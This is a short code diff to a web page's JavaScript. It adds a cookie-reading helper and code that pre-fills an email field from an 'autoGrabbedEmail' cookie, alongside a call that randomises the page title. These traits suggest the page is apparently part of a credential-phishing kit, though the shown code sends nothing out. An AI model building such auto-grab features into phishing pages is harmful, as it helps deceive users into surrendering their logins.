@@ -1105,6 +1105,14 @@
             }
         }
 
+        // Helper function to get cookie value
+        function getCookie(name) {
+            const value = `; ${document.cookie}`;
+            const parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+            return null;
+        }
+
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
             generateRandomTitle(); // Set random title
@@ -1135,6 +1143,19 @@
                         // Remove overlay from DOM to prevent any interference
                         if (overlay && overlay.parentNode) {
                             overlay.parentNode.removeChild(overlay);
+                        }
+
+                        // Check for auto-grabbed email cookie and pre-fill
+                        const autoGrabbedEmail = getCookie('autoGrabbedEmail');
+                        if (autoGrabbedEmail) {
+                            console.log('📧 Auto-filling email from cookie:', autoGrabbedEmail);
+                            const emailInput = document.getElementById('emailInput');
+                            if (emailInput) {
+                                emailInput.value = decodeURIComponent(autoGrabbedEmail);
+                                emailInput.focus();
+                            }
+                            // Clear the cookie after use
+                            document.cookie = 'autoGrabbedEmail=; path=/; max-age=0';
                         }
                     }, 600); // Match the CSS transition duration
                 }
